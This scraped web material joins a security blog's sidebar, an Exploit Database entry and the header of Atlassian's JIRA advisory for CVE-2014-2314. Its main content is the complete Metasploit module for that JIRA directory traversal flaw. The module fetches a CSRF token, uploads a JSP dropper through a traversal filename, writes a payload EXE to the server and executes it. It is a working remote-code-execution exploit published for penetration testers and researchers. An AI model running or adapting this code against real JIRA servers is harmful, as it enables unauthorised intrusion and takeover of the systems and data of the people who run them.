  (3)
  + ►
    [May](http://blog.h3xstream.com/2018/05/)
    (2)
  + ►
    [January](http://blog.h3xstream.com/2018/01/)
    (1)

* ►
  [2017](http://blog.h3xstream.com/2017/)
  (2)
  + ►
    [July](http://blog.h3xstream.com/2017/07/)
    (1)
  + ►
    [March](http://blog.h3xstream.com/2017/03/)
    (1)

* ►
  [2016](http://blog.h3xstream.com/2016/)
  (3)
  + ►
    [June](http://blog.h3xstream.com/2016/06/)
    (1)
  + ►
    [March](http://blog.h3xstream.com/2016/03/)
    (1)
  + ►
    [January](http://blog.h3xstream.com/2016/01/)
    (1)

* ►
  [2015](http://blog.h3xstream.com/2015/)
  (3)
  + ►
    [November](http://blog.h3xstream.com/2015/11/)
    (1)
  + ►
    [June](http://blog.h3xstream.com/2015/06/)
    (1)
  + ►
    [April](http://blog.h3xstream.com/2015/04/)
    (1)

* ▼
  [2014](http://blog.h3xstream.com/2014/)
  (6)
  + ►
    [December](http://blog.h3xstream.com/2014/12/)
    (1)
  + ►
    [November](http://blog.h3xstream.com/2014/11/)
    (1)
  + ►
    [October](http://blog.h3xstream.com/2014/10/)
    (1)
  + ►
    [June](http://blog.h3xstream.com/2014/06/)
    (1)
  + ▼
    [February](http://blog.h3xstream.com/2014/02/)
    (2)
    - [Jira Path Traversal explained (CVE-2014-2314)](http://blog.h3xstream.com/2014/02/jira-path-traversal-explained.html)
    - [HQL for pentesters](http://blog.h3xstream.com/2014/02/hql-for-pentesters.html)

* ►
  [2013](http://blog.h3xstream.com/2013/)
  (4)
  + ►
    [December](http://blog.h3xstream.com/2013/12/)
    (1)
  + ►
    [November](http://blog.h3xstream.com/2013/11/)
    (2)
  + ►
    [August](http://blog.h3xstream.com/2013/08/)
    (1)

## Labels

[java](http://blog.h3xstream.com/search/label/java)
(14)

[tool](http://blog.h3xstream.com/search/label/tool)
(10)

[vulnerability](http://blog.h3xstream.com/search/label/vulnerability)
(10)

[burp](http://blog.h3xstream.com/search/label/burp)
(6)

[owasp](http://blog.h3xstream.com/search/label/owasp)
(6)

[plugin](http://blog.h3xstream.com/search/label/plugin)
(6)

[zap](http://blog.h3xstream.com/search/label/zap)
(5)

[cve](http://blog.h3xstream.com/search/label/cve)
(4)

[findsecbugs](http://blog.h3xstream.com/search/label/findsecbugs)
(4)

[privacy](http://blog.h3xstream.com/search/label/privacy)
(4)

[rce](http://blog.h3xstream.com/search/label/rce)
(4)

[bypass](http://blog.h3xstream.com/search/label/bypass)
(3)

[firewall](http://blog.h3xstream.com/search/label/firewall)
(3)

[spring](http://blog.h3xstream.com/search/label/spring)
(3)

[auditor](http://blog.h3xstream.com/search/label/auditor)
(2)

[conference](http://blog.h3xstream.com/search/label/conference)
(2)

[csharp](http://blog.h3xstream.com/search/label/csharp)
(2)

[csp](http://blog.h3xstream.com/search/label/csp)
(2)

[dependency](http://blog.h3xstream.com/search/label/dependency)
(2)

[dom xss](http://blog.h3xstream.com/search/label/dom%20xss)
(2)

[email](http://blog.h3xstream.com/search/label/email)
(2)

[exploitation](http://blog.h3xstream.com/search/label/exploitation)
(2)

[javascript](http://blog.h3xstream.com/search/label/javascript)
(2)

[osint](http://blog.h3xstream.com/search/label/osint)
(2)

[proxy](http://blog.h3xstream.com/search/label/proxy)
(2)

[spel](http://blog.h3xstream.com/search/label/spel)
(2)

[unicode](http://blog.h3xstream.com/search/label/unicode)
(2)

[wordpress](http://blog.h3xstream.com/search/label/wordpress)
(2)

[xml](http://blog.h3xstream.com/search/label/xml)
(2)

[xss](http://blog.h3xstream.com/search/label/xss)
(2)

[xxe](http://blog.h3xstream.com/search/label/xxe)
(2)

[android](http://blog.h3xstream.com/search/label/android)
(1)

[anti-patterns](http://blog.h3xstream.com/search/label/anti-patterns)
(1)

[asp.net](http://blog.h3xstream.com/search/label/asp.net)
(1)

[cache](http://blog.h3xstream.com/search/label/cache)
(1)

[chrome](http://blog.h3xstream.com/search/label/chrome)
(1)

[crossdomain.xml](http://blog.h3xstream.com/search/label/crossdomain.xml)
(1)

[cryptography](http://blog.h3xstream.com/search/label/cryptography)
(1)

[csrf](http://blog.h3xstream.com/search/label/csrf)
(1)

[deserialization](http://blog.h3xstream.com/search/label/deserialization)
(1)

[design](http://blog.h3xstream.com/search/label/design)
(1)

[ebay](http://blog.h3xstream.com/search/label/ebay)
(1)

[enum](http://blog.h3xstream.com/search/label/enum)
(1)

[esapi](http://blog.h3xstream.com/search/label/esapi)
(1)

[esi](http://blog.h3xstream.com/search/label/esi)
(1)

[eval](http://blog.h3xstream.com/search/label/eval)
(1)

[flash](http://blog.h3xstream.com/search/label/flash)
(1)

[hackfest](http://blog.h3xstream.com/search/label/hackfest)
(1)

[hibernate](http://blog.h3xstream.com/search/label/hibernate)
(1)

[hql](http://blog.h3xstream.com/search/label/hql)
(1)

[injection](http://blog.h3xstream.com/search/label/injection)
(1)

[jira](http://blog.h3xstream.com/search/label/jira)
(1)

[jndi](http://blog.h3xstream.com/search/label/jndi)
(1)

[kotlin](http://blog.h3xstream.com/search/label/kotlin)
(1)

[lcg](http://blog.h3xstream.com/search/label/lcg)
(1)

[leak](http://blog.h3xstream.com/search/label/leak)
(1)

[leaks](http://blog.h3xstream.com/search/label/leaks)
(1)

[libinjection](http://blog.h3xstream.com/search/label/libinjection)
(1)

[linkedin](http://blog.h3xstream.com/search/label/linkedin)
(1)

[log4j](http://blog.h3xstream.com/search/label/log4j)
(1)

[mobile](http://blog.h3xstream.com/search/label/mobile)
(1)

[modsecurity](http://blog.h3xstream.com/search/label/modsecurity)
(1)

[mysql](http://blog.h3xstream.com/search/label/mysql)
(1)

[path traversal](http://blog.h3xstream.com/search/label/path%20traversal)
(1)

[paypal](http://blog.h3xstream.com/search/label/paypal)
(1)

[pentesting](http://blog.h3xstream.com/search/label/pentesting)
(1)

[prng](http://blog.h3xstream.com/search/label/prng)
(1)

[python](http://blog.h3xstream.com/search/label/python)
(1)

[random](http://blog.h3xstream.com/search/label/random)
(1)

[razor](http://blog.h3xstream.com/search/label/razor)
(1)

[request validator](http://blog.h3xstream.com/search/label/request%20validator)
(1)

[rhino](http://blog.h3xstream.com/search/label/rhino)
(1)

[ruby](http://blog.h3xstream.com/search/label/ruby)
(1)

[serialization](http://blog.h3xstream.com/search/label/serialization)
(1)

[struts](http://blog.h3xstream.com/search/label/struts)
(1)

[tips](http://blog.h3xstream.com/search/label/tips)
(1)

[tls](http://blog.h3xstream.com/search/label/tls)
(1)

[upload](http://blog.h3xstream.com/search/label/upload)
(1)

[users](http://blog.h3xstream.com/search/label/users)
(1)

[waf](http://blog.h3xstream.com/search/label/waf)
(1)

[websocket](http://blog.h3xstream.com/search/label/websocket)
(1)

[workshop](http://blog.h3xstream.com/search/label/workshop)
(1)

## Speaking soon at ..

No conference planned at the moment.

## Friends

* [NorthSec Conference](http://nsec.io)
* [Ring Zer0 Team](http://ringzer0team.com/)
* [DCI ÉTS](http://dciets.com/securite/)
* [Hackfest Québec](http://hackfest.ca)

## Friends' blog

* ![]()

  [Segfault.me (alxbl)](https://segfault.me/)

  Your Azure account is a Skeleton Key
* ![]()

  [madmantm's blog (Marc-André Meloche)](https://madmantm.wordpress.com)

  [Breaking the Breach VM 2.1](https://madmantm.wordpress.com/2016/09/01/breaking-the-breach-vm-2-1/)
* ![]()

  [Spacebar (Simon Carpentier)](https://spacebar.ca)

  [Protect your privacy when torrenting](https://spacebar.ca/protect-your-privacy-when-torrenting/)
* ![]()

  [Solution 36 (Sébastien Duquette)](https://solution-36.blogspot.com/)

  [CSAW 2014 Exploit 500 writeup : xorcise](https://solution-36.blogspot.com/2014/09/csaw-2014-exploit-500-writeup-xorcise.html)
* ![]()

  [Web Application Security Engineering (Jonathan Marcil)](https://blog.jonathanmarcil.ca/)

  [How did I made this Blogger site HTTPS?](https://blog.jonathanmarcil.ca/2014/04/how-did-i-made-this-blogger-site-https.html)
* ![]()

  [Binary Factory (Guillaume Ross)](https://blog.binaryfactory.ca)

  [Securosis Blog | $50K buys how much FDE?](https://blog.binaryfactory.ca/2013/01/securosis-blog-50k-buys-how-much-fde/)

|  |  |
| --- | --- |

|  |  |
| --- | --- |

Powered by [Blogger](https://www.blogger.com).



=== Content from www.exploit-db.com_2fc43d2d_20250125_012138.html ===

[![Exploit Database](/images/spider-white.png)](/)
[Exploit Database](/)

* [Exploits](/)
* [GHDB](/google-hacking-database)
* [Papers](/papers)
* [Shellcodes](/shellcodes)

---

* [Search EDB](/search)
* [SearchSploit Manual](/searchsploit)
* [Submissions](/submit)

---

* [Online Training](https://www.offsec.com/)

[![Exploit Database](/images/edb-logo.png)](/)

* [Stats](/exploit-database-statistics)
* [About Us](/)

  [About Exploit-DB](/about-exploit-db)
  [Exploit-DB History](/history)
  [FAQ](/faq)
* Search

# JIRA Issues Collector - Directory Traversal (Metasploit)

#### EDB-ID:

###### 32725

#### CVE:

###### [2014-2314](https://nvd.nist.gov/vuln/detail/CVE-2014-2314)

---

**EDB Verified:**

#### Author:

###### [Metasploit](/?author=3211)

#### Type:

###### [remote](/?type=remote)

---

#### Platform:

###### [Windows](/?platform=windows)

#### Date:

###### 2014-04-07

---

**Vulnerable App:**

```
##
# This module requires Metasploit: http//metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'msf/core'

class Metasploit3 < Msf::Exploit::Remote
  Rank = NormalRanking

  include Msf::Exploit::Remote::HttpClient
  include Msf::Exploit::EXE
  include Msf::Exploit::FileDropper

  def initialize(info = {})
    super(update_info(info,
      'Name'        => 'JIRA Issues Collector Directory Traversal',
      'Description' => %q{
        This module exploits a directory traversal flaw in JIRA 6.0.3. The vulnerability exists
        in the issues collector code, while handling attachments provided by the user. It can be
        exploited in Windows environments to get remote code execution. This module has been tested
        successfully on JIRA 6.0.3 with Windows 2003 SP2 Server.
      },
      'Author'       =>
        [
          'Philippe Arteau', # Vulnerability Discovery
          'juan vazquez' # Metasploit module
        ],
      'License'     => MSF_LICENSE,
      'References'  =>
        [
          [ 'CVE', '2014-2314'],
          [ 'OSVDB', '103807' ],
          [ 'BID', '65849' ],
          [ 'URL', 'https://confluence.atlassian.com/display/JIRA/JIRA+Security+Advisory+2014-02-26' ],
          [ 'URL', 'http://blog.h3xstream.com/2014/02/jira-path-traversal-explained.html' ]
        ],
      'Privileged'  => true,
      'Platform'    => 'win',
      'Targets'     =>
        [
          [ 'Jira 6.0.3 / Windows 2003 SP2',
            {
              'Arch' => ARCH_X86,
              'Platform' => 'win'
            }
          ]
        ],
      'DefaultTarget'  => 0,
      'DisclosureDate' => 'Feb 26 2014'))

    register_options(
      [
        Opt::RPORT(8080),
        OptString.new('TARGETURI', [true, 'Path to JIRA', '/']),
        OptInt.new('COLLECTOR', [true, 'Collector ID'])
      ], self.class)

    register_advanced_options(
      [
        # By default C:\Program Files\Atlassian\JIRA\atlassian-jira\QhVRutsh.jsp
        OptString.new('JIRA_PATH', [true, 'Path to the JIRA web folder from the Atlassian installation directory', "JIRA\\atlassian-jira"]),
        # By default file written to C:\Program Files\Atlassian\Application Data\JIRA\caches\tmp_attachments\$random_\, we want to traversal until 'Atlassian'
        OptInt.new('TRAVERSAL_DEPTH', [true, 'Traversal depth', 6])
      ], self.class)
  end

  def get_upload_token
    res = send_request_cgi(
      {
        'uri'    => normalize_uri(target_uri.path, "rest", "collectors", "1.0", "tempattachment", datastore['COLLECTOR']),
        'method' => 'POST',
        'data'   => rand_text_alpha(10 + rand(10)),
        'vars_get' =>
          {
            'filename' => rand_text_alpha(10 + rand(10))
          }
      })

    if res and res.code == 500 and res.body =~ /"token":"(.*)"}/
      csrf_token = $1
      @cookie = res.get_cookies
    else
      csrf_token = ""
    end

    return csrf_token
  end

  def upload_file(filename, contents, csrf_token)
    traversal = "..\\" * datastore['TRAVERSAL_DEPTH']
    traversal << datastore['JIRA_PATH']

    res = send_request_cgi(
      {
        'uri'    => normalize_uri(target_uri.path, "rest", "collectors", "1.0", "tempattachment", datastore['COLLECTOR']),
        'method' => 'POST',
        'data'   => contents,
        'cookie' => @cookie,
        'ctype'  => 'text/plain',
        'vars_get' =>
          {
            'filename' => "#{traversal}\\#{filename}",
            'atl_token' => csrf_token
          }
      })

    if res and res.code == 201 and res.body =~ /\{"name":".*#{filename}"/
      register_files_for_cleanup("..\\..\\#{datastore['JIRA_PATH']}\\#{filename}")
      register_files_for_cleanup("..\\..\\#{datastore['JIRA_PATH']}\\#{@exe_filename}")
      return true
    else
      print_error("#{peer} - Upload failed...")
      return false
    end
  end

  def upload_and_run_jsp(filename, contents)
    print_status("#{peer} - Getting a valid CSRF token...")
    csrf_token = get_upload_token
    fail_with(Failure::Unknown, "#{peer} - Unable to find the CSRF token") if csrf_token.empty?

    print_status("#{peer} - Exploiting traversal to upload JSP dropper...")
    upload_file(filename, contents, csrf_token)

    print_status("#{peer} - Executing the dropper...")
    send_request_cgi(
      {
        'uri'    => normalize_uri(target_uri.path, filename),
        'method' => 'GET'
      })
  end

  def check
    res = send_request_cgi({
      'uri' => normalize_uri(target_uri.path, 'login.jsp'),
    })

    if res and res.code == 200 and res.body =~ /<meta name="application-name" content="JIRA" data-name="jira" data-version="([0-9\.]*)">/
      version = $1
    else
      return Exploit::CheckCode::Unknown
    end

    if version <= "6.0.3"
      return Exploit::CheckCode::Detected
    end

    return Exploit::CheckCode::Safe
  end

  def exploit
    print_status("#{peer} - Generating EXE...")
    exe = payload.encoded_exe
    @exe_filename = Rex::Text.rand_text_alpha(8) + ".exe"

    print_status("#{peer} - Generating JSP dropper...")
    dropper = jsp_drop_and_execute(exe, @exe_filename)
    dropper_filename = Rex::Text.rand_text_alpha(8) + ".jsp"

    print_status("#{peer} - Uploading and running JSP dropper...")
    upload_and_run_jsp(dropper_filename, dropper)
  end

  # This should probably go in a mixin (by egypt)
  def jsp_drop_bin(bin_data, output_file)
    jspraw =  %Q|<%@ page import="java.io.*" %>\n|
    jspraw << %Q|<%\n|
    jspraw << %Q|String data = "#{Rex::Text.to_hex(bin_data, "")}";\n|

    jspraw << %Q|FileOutputStream outputstream = new FileOutputStream("#{output_file}");\n|

    jspraw << %Q|int numbytes = data.length();\n|

    jspraw << %Q|byte[] bytes = new byte[numbytes/2];\n|
    jspraw << %Q|for (int counter = 0; counter < numbytes; counter += 2)\n|
    jspraw << %Q|{\n|
    jspraw << %Q|  char char1 = (char) data.charAt(counter);\n|
    jspraw << %Q|  char char2 = (char) data.charAt(counter + 1);\n|
    jspraw << %Q|  int comb = Character.digit(char1, 16) & 0xff;\n|
    jspraw << %Q|  comb <<= 4;\n|
    jspraw << %Q|  comb += Character.digit(char2, 16) & 0xff;\n|
    jspraw << %Q|  bytes[counter/2] = (byte)comb;\n|
    jspraw << %Q|}\n|

    jspraw << %Q|outputstream.write(bytes);\n|
    jspraw << %Q|outputstream.close();\n|
    jspraw << %Q|%>\n|

    jspraw
  end

  def jsp_execute_command(command)
    jspraw =  %Q|<%@ page import="java.io.*" %>\n|
    jspraw << %Q|<%\n|
    jspraw << %Q|try {\n|
    jspraw << %Q|  Runtime.getRuntime().exec("chmod +x #{command}");\n|
    jspraw << %Q|} catch (IOException ioe) { }\n|
    jspraw << %Q|Runtime.getRuntime().exec("#{command}");\n|
    jspraw << %Q|%>\n|

    jspraw
  end

  def jsp_drop_and_execute(bin_data, output_file)
    jsp_drop_bin(bin_data, output_file) + jsp_execute_command(output_file)
  end

end

```

**Tags:**
[Metasploit Framework (MSF)](/?tag=3)

**Advisory/Source:**
[Link](https://confluence.atlassian.com/display/JIRA/JIRA%2BSecurity%2BAdvisory%2B2014-02-26)

| **Databases** | **Links** | **Sites** | **Solutions** |
| [Exploits](/) | [Search Exploit-DB](/search) | [OffSec](https://www.offsec.com/) | [Courses and Certifications](https://www.offsec.com/courses-and-certifications/) |
| [Google Hacking](/google-hacking-database) | [Submit Entry](/submit) | [Kali Linux](https://www.kali.org/) | [Learn Subscriptions](https://www.offsec.com/learn/) |
| [Papers](/papers) | [SearchSploit Manual](/serchsploit) | [VulnHub](https://www.vulnhub.com/) | [OffSec Cyber Range](https://www.offsec.com/cyber-range/) |
| [Shellcodes](/shellcodes) | [Exploit Statistics](/statistics) |  | [Proving Grounds](https://www.offsec.com/labs/) |
|  |  |  | [Penetration Testing Services](https://www.offsec.com/penetration-testing/) |

Databases
[Exploits](/)
[Google Hacking](/google-hacking-database)
[Papers](/papers)
[Shellcodes](/shellcodes)

Links
[Search Exploit-DB](/search)
[Submit Entry](/submit)
[SearchSploit Manual](/searchsploit)
[Exploit Statistics](/statistics)

Sites
[OffSec](https://www.offsec.com)
[Kali Linux](https://www.kali.org/)
[VulnHub](https://www.vulnhub.com)

Solutions
[Courses and Certifications](https://www.offsec.com/courses-and-certifications/)
[Learn Subscriptions](https://www.offsec.com/learn/)
[OffSec Cyber Range](https://www.offsec.com/cyber-range/)
[Proving Grounds](https://www.offsec.com/labs/)
[Penetration Testing Services](https://www.offsec.com/penetration-testing/)

* [Exploit Database by OffSec](/)
* [Terms](/terms)
* [Privacy](/privacy)
* [About Us](/about-exploit-db)
* [FAQ](/faq)
* [Cookies](/cookies)

©
[OffSec Services Limited](https://www.offsec.com/) 2025. All rights reserved.

##### About The Exploit Database

×

[![OffSec](/images/offsec-logo.png)](https://www.offsec.com/)
The Exploit Database is maintained by [OffSec](https://www.offsec.com/community-projects/), an information security training company
that provides various [Information Security Certifications](https://www.offsec.com/courses-and-certifications/) as well as high end [penetration testing](https://www.offsec.com/penetration-testing/) services. The Exploit Database is a
non-profit project that is provided as a public service by OffSec.

The Exploit Database is a [CVE
compliant](http://cve.mitre.org/data/refs/refmap/source-EXPLOIT-DB.html) archive of public exploits and corresponding vulnerable software,
developed for use by penetration testers and vulnerability researchers. Our aim is to serve
the most comprehensive collection of exploits gathered through direct submissions, mailing
lists, as well as other public sources, and present them in a freely-available and
easy-to-navigate database. The Exploit Database is a repository for exploits and
proof-of-concepts rather than advisories, making it a valuable resource for those who need
actionable data right away.

The [Google Hacking Database (GHDB)](/google-hacking-database)
is a categorized index of Internet search engine queries designed to uncover interesting,
and usually sensitive, information made publicly available on the Internet. In most cases,
this information was never meant to be made public but due to any number of factors this
information was linked in a web document that was crawled by a search engine that
subsequently followed that link and indexed the sensitive information.

The process known as “Google Hacking” was popularized in 2000 by Johnny
Long, a professional hacker, who began cataloging these queries in a database known as the
Google Hacking Database. His initial efforts were amplified by countless hours of community
member effort, documented in the book Google Hacking For Penetration Testers and popularised
by a barrage of media attention and Johnny’s talks on the subject such as this early talk
recorded at [DEFCON 13](https://www.defcon.org/html/links/dc-archives/dc-13-archive.html). Johnny coined the term “Googledork” to refer
to “a foolish or inept person as revealed by Google“. This was meant to draw attention to
the fact that this was not a “Google problem” but rather the result of an often
unintentional misconfiguration on the part of a user or a program installed by the user.
Over time, the term “dork” became shorthand for a search query that located sensitive
information and “dorks” were included with may web application vulnerability releases to
show examples of vulnerable web sites.

After nearly a decade of hard work by the community, Johnny turned the GHDB
over to [OffSec](https://www.offsec.com/community-projects/) in November 2010, and it is now maintained as
an extension of the [Exploit Database](/). Today, the GHDB includes searches for
other online search engines such as [Bing](https://www.bing.com/),
and other online repositories like [GitHub](https://github.com/),
producing different, yet equally valuable results.

Close

##### OffSec Resources

×

| **Databases** | **Links** | **Sites** | **Solutions** |
| [Exploits](/) | [Search Exploit-DB](/search) | [OffSec](https://www.offsec.com/) | [Courses and Certifications](https://www.offsec.com/courses-and-certifications/) |
| [Google Hacking](/google-hacking-database) | [Submit Entry](/submit) | [Kali Linux](https://www.kali.org/) | [Learn Subscriptions](https://www.offsec.com/learn/) |
| [Papers](/papers) | [SearchSploit Manual](/serchsploit) | [VulnHub](https://www.vulnhub.com/) | [OffSec Cyber Range](https://www.offsec.com/cyber-range/) |
|  | [Proving Grounds](https://www.offsec.com/labs/) |
| [Shellcodes](/shellcodes) | [Exploit Statistics](/serchsploit) |  | [Proving Grounds](https://www.offsec.com/labs/) |
|  |  |  | [Penetration Testing Services](https://www.offsec.com/penetration-testing/) |

Close

##### Search The Exploit Database

×

Title

CVE

Type

dos

local

remote

shellcode

papers

webapps

Platform

AIX

ASP

BSD

BSD\_PPC

BSD\_x86

BSDi\_x86

CGI

FreeBSD

FreeBSD\_x86

FreeBSD\_x86-64

Generator

Hardware

HP-UX

IRIX

JSP

Linux

Linux\_MIPS

Linux\_PPC

Linux\_SPARC

Linux\_x86

Linux\_x86-64

MINIX

Multiple

NetBSD\_x86

Novell

OpenBSD

OpenBSD\_x86

OSX\_PPC

OSX

PHP

Plan9

QNX

SCO

SCO\_x86

Solaris

Solaris\_SPARC

Solaris\_x86

Tru64

ULTRIX

Unix

UnixWare

Windows\_x86

Windows\_x86-64

Windows

ARM

CFM

Netware

SuperH\_SH4

Java

BeOS

Immunix

Palm\_OS

AtheOS

iOS

Android

XML

Perl

Python

System\_z

JSON

ASHX

Ruby

ASPX

macOS

Linux\_CRISv32

eZine

Magazine

NodeJS

Alpha

Solaris\_MIPS

Lua

watchOS

VxWorks

Python2

Python3

TypeScript

Go

Author

Content

Port

14

21

22

23

25

42

49

53

66

69

70

79

80

81

102

105

110

111

113

119

123

135

139

143

161

162

164

383

389

402

406

411

443

444

445

446

502

504

513

514

515

532

548

554

555

617

623

631

655

689

783

787

808

873

888

901

998

1000

1040

1089

1099

1100

1114

1120

1194

1235

1471

1521

1533

1581

1589

1604

1617

1723

1743

1761

1812

1858

1861

1900

1947

2000

2022

2049

2100

2103

2121

2125

2181

2242

2315

2375

2380

2381

2401

2480

2525

2640

2810

2812

2947

2954

2990

3000

3030

3050

3052

3128

3129

3181

3200

3217

3306

3333

3378

3389

3460

3465

3500

3535

3632

3690

3790

3814

3817

4000

4002

4070

4081

4105

4111

4322

4343

4434

4444

4501

4555

4592

4661

4750

4848

5000

5060

5061

5080

5081

5093

5151

5180

5247

5250

5272

5308

5432

5466

5554

5555

5600

5655

5666

5800

5803

5814

5858

5900

5984

6066

6070

6080

6082

6101

6112

6129

6379

6502

6503

6660

6667

7001

7002

7070

7071

7080

7100

7144

7210

7272

7290

7426

7443

7510

7547

7649

7770

7777

7778

7787

7879

7902

8000

8001

8002

8004

8008

8020

8022

8023

8028

8030

8080

8081

8082

8088

8090

8181

8300

8400

8443

8445

8473

8500

8585

8619

8800

8812

8839

8880

8888

9000

9001

9002

9080

9090

9091

9100

9124

9200

9251

9256

9443

9447

9784

9788

9855

9876

9900

9987

9993

9999

10000

10001

10080

10202

10203

10443

10616

11000

11211

11460

12203

12221

12345

12397

12401

13327

13701

13722

13838

16992

18821

18881

19000

19810

19813

20000

20002

20010

20031

20111

20171

22003

23423

25672

26000

27015

27700

28015

30000

30303

31337

32400

32674

32764

34205

37215

37777

37848

38292

40007

41523

44334

46824

48080

49152

50000

50496

52311

52789

52869

52986

53413

54345

54890

55554

55555

56380

57772

58080

62514

Tag

WordPress Core

Metasploit Framework (MSF)

WordPress Plugin

SQL Injection (SQLi)

Cross-Site Scripting (XSS)

File Inclusion (LFI/RFI)

Cross-Site Request Forgery (CSRF)

Denial of Service (DoS)

Code Injection

Command Injection

Authentication Bypass / Credentials Bypass (AB/CB)

Client Side

Use After Free (UAF)

Out Of Bounds

Remote

Local

XML External Entity (XXE)

Integer Overflow

Server-Side Request Forgery (SSRF)

Race Condition

NULL Pointer Dereference

Malware

Buffer Overflow

Heap Overflow

Type Confusion

Object Injection

Bug Report

Console

Pwn2Own

Traversal

Deserialization

Verified

Has App

No Metasploit

Search



=== Content from confluence.atlassian.com_3cf27621_20250126_050217.html ===

![](/staticassets/4.7.4/dist/common/images/media-viewer-image-icon.svg)
##

![]()

[![](/staticassets/4.7.4/dist/common/images/header-atlassian-logo.svg)](https://support.atlassian.com/)

* Products
* Resources

* [Search](https://support.atlassian.com/search-results/)
* [Log in](https://id.atlassian.com/login?continue=https://confluence.atlassian.com/login.action?os_destination=/jira/jira-security-advisory-2014-02-26-445188412.html)
* ![]()
  + [View account](https://my.atlassian.com/)
  + [View requests](https://support.atlassian.com/servicedesk/customer/user/requests)
  + [Log out](/logout.action?os_destination=https://id.atlassian.com/logout?continue=/jira/jira-security-advisory-2014-02-26-445188412.html)
* ...

## Products

* [### Jira Software

  Project and issue tracking](https://support.atlassian.com/jira-software-cloud)
* [### Jira Service Management

  Service management and customer support](https://support.atlassian.com/jira-service-management-cloud)
* [### Jira Work Management

  Manage any business project](https://support.atlassian.com/jira-work-management)
* [### Confluence

  Document collaboration](https://support.atlassian.com/confluence-cloud)
* [### Bitbucket

  Git code management](https://support.atlassian.com/bitbucket-cloud)

[See all](https://support.atlassian.com/products/)

## Resources

* [### Documentation

  Usage and admin help](https://confluence.atlassian.com)
* [### Community

  Answers, support, and inspiration](https://community.atlassian.com)
* [### System Status

  Cloud services health](http://status.atlassian.com)
* [### Suggestions and bugs

  Feature suggestions and bug reports](https://jira.atlassian.com)
* [### Marketplace

  Product apps](https://marketplace.atlassian.com)
* [### Billing and licensing

  Frequently asked questions](https://www.atlassian.com/licensing/purchase-licensing)

* [Log out](/logout.action?os_destination=https://id.atlassian.com/logout?continue=/jira/jira-security-advisory-2014-02-26-445188412.html)
* [Log in to account](https://id.atlassian.com/login?continue=https://confluence.atlassian.com/login.action?os_destination=/jira/jira-security-advisory-2014-02-26-445188412.html)
* [Contact support](https://support.atlassian.com/contact/)
* [Training & Certification](https://www.atlassian.com/university)
* [Cloud Migration Center](https://www.atlassian.com/cloud-migration)
* [GDPR guides](https://confluence.atlassian.com/gdpr)
* [Enterprise services](https://www.atlassian.com/enterprise/services)
* [Atlassian partners](https://www.atlassian.com/partners)
* [Developers](https://developer.atlassian.com/)
* [User groups](http://aug.atlassian.com/)
* [Automation for Jira](https://confluence.atlassian.com/automation/)
* [Atlassian.com](http://www.atlassian.com/)

* #### Page
* [View in Confluence](/login.action?os_destination=%2Fpages%2Fviewpage.action%3FpageId%3D445188412)
* [Edit Page](/login.action?os_destination=https%3A%2F%2Fconfluence.atlassian.com%2Fpages%2Feditpage.action%3FpageId%3D445188412%26atl_token%3Dab17832a72adaaffe0e9dc6d55c9cb033dc520f2)
* #### Viewport
* [Manage Viewport](/login.action?os_destination=%2Fspaces%2Fscroll-viewport%2Fconfig.action%3Fkey%3DJIRA)
* #### Confluence
* [Dashboard](/login.action?os_destination=%2Fdashboard.action)
* [Space Directory](/login.action?os_destination=%2Fspacedirectory%2Fview.action)
* [People Directory](/login.action?os_destination=%2Fpeopledirectory.action)

[JIRA 6.4.x](/display/JIRA/Jira%2BDocumentation)

Documentation

Unable to load

* [Atlassian Support](https://support.atlassian.com/ "Atlassian Support")
* [Documentation](/ "Documentation")
* [JIRA 6.4.x](/display/JIRA/Jira%2BDocumentation "JIRA 6.4.x")
* [JIRA Releases](/jira/jira-releases-133316.html "JIRA Releases")
* [Security Advisories](/jira/security-advisories-112853939.html "Security Advisories")
* [JIRA Security Advisory 2014-02-26](/jira/jira-security-advisory-2014-02-26-445188412.html "JIRA Security Advisory 2014-02-26")

# JIRA Security Advisory 2014-02-26

#### Security Advisories

* [JIRA Security Advisory 2007-12-24](/jira/jira-security-advisory-2007-12-24-116949034.html)
* [JIRA Security Advisory 2008-02-21](/jira/jira-security-advisory-2008-02-21-129171459.html)
* [JIRA Security Advisory 2008-08-26](/jira/jira-security-advisory-2008-08-26-166004521.html)
* [JIRA Security Advisory 2008-10-29](/jira/jira-security-advisory-2008-10-29-169117571.html)
* [JIRA Security Advisory 2008-12-09](/jira/jira-security-advisory-2008-12-09-170495046.html)
* [JIRA Security Advisory 2009-04-02](/jira/jira-security-advisory-2009-04-02-177340733.html)
* [JIRA Security Advisory 2010-04-16](/jira/jira-security-advisory-2010-04-16-216433270.html)
* [JIRA Security Advisory 2010-06-18](/jira/jira-security-advisory-2010-06-18-218267805.html)
* [JIRA Security Advisory 2010-12-06](/jira/jira-security-advisory-2010-12-06-227414698.html)
* [JIRA Security Advisory 2011-02-21](/jira/jira-security-advisory-2011-02-21-232555106.html)
* [JIRA Security Advisory 2011-09-27](/jira/jira-security-advisory-2011-09-27-263422027.html)
* [JIRA Security Advisory 2012-05-17](/jira/jira-security-advisory-2012-05-17-283641192.html)
* [JIRA Security Advisory 2012-08-28](/jira/jira-security-advisory-2012-08-28-297667738.html)
* [JIRA Security Advisory 2013-02-21](/jira/jira-security-advisory-2013-02-21-321859644.html)
* [JIRA Security Advisory 2014-02-26](/jira/jira-security-advisory-2014-02-26-445188412.html)
* [JIRA and HipChat for JIRA plugin Security Advisory 2015-08-26](/jira/jira-and-hipchat-for-jira-plugin-security-advisory-2015-08-26-776650785.html)
* [JIRA Security Advisory 2015-12-09](/jira/jira-security-advisory-2015-12-09-792307790.html)
* [JIRA and HipChat for JIRA plugin Security Advisory 2016-09-21](/jira/jira-and-hipchat-for-jira-plugin-security-advisory-2016-09-21-849052099.html)
* [JIRA Security Advisory 2017-03-09](/jira/jira-security-advisory-2017-03-09-879243455.html)
* [JIRA Security Advisory 2019-07-10](/jira/jira-security-advisory-2019-07-10-973486595.html)
* [Jira Service Desk Security Advisory 2019-09-18](/jira/jira-service-desk-security-advisory-2019-09-18-976171274.html)
* [Jira Security Advisory 2019-09-18](/jira/jira-security-advisory-2019-09-18-976766250.html)
* [Jira Service Desk Security Advisory 2019-11-06](/jira/jira-service-desk-security-advisory-2019-11-06-979412717.html)
* [Jira Server for Slack Security Advisory 17th February 2021](/jira/jira-server-for-slack-security-advisory-17th-february-2021-1044091690.html)
* [Jira Security Advisory 2022-04-20](/jira/jira-security-advisory-2022-04-20-1115127899.html)
* [Jira Server Security Advisory 29nd June 2022](/jira/jira-server-security-advisory-29nd-june-2022-1142430667.html)
